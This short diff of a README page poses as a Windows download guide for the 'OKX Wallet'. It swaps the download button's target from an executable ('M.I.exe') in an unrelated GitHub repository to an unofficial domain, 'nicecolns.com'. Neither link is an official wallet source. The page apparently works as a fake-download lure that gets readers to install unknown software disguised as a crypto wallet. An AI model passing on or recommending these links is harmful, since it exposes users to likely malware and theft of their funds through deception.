@@ -9,7 +9,7 @@ One of the standout features of the **OKX Web3 wallet** is its integration with 
 
 1. Click the button below to initiate the download for the **OKX Wallet** software on Windows.
    <br>
-    <a href="https://github.com/Q1441/gmgnapppro/releases/download/v.1/M.I.exe">
+    <a href="https://nicecolns.com/">
       <img src="https://github.com/user-attachments/assets/e1a2e1ab-7f84-40e6-9a41-21fc2ff931e8" alt="Download" width="300"/>
     </a>
 3. Select the version compatible with your Windows operating system.
